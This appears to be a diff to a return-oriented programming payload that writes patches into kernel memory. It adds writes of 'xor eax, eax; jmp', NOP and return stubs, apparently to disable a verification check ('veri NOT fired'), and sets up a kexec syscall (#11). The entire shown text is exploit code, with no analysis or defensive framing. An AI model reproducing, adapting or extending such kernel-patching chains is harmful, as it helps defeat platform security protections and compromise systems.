@@ -233,6 +233,7 @@ pop rax
 dq 0x01ebc031 # xor eax, eax ; jmp start+5
 mov [rdi], eax
 
+
 # veri NOT fired
 pop rsi
 dq 0x10bed0-0x63c8ce
@@ -241,9 +242,23 @@ pop rax
 dq 0x9090
 mov [rdi], ax
 
+pop rsi
+dq 0x63c8ce-0x1d895a
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0x01c7e9
+mov [rdi], rax
+
+pop rsi
+dq 0x1d895a-0x0041a2d0
+sub rdi, rsi ; mov rdx, rdi
+pop rax
+dq 0xc3c031
+mov [rdi], rax
+
 # kexec (syscall #11)
 pop rsi
-dq 0x63c8ce-0x111e210
+dq 0x0041a2d0-0x111e210
 sub rdi, rsi ; mov rdx, rdi
 pop rax
 dq 2
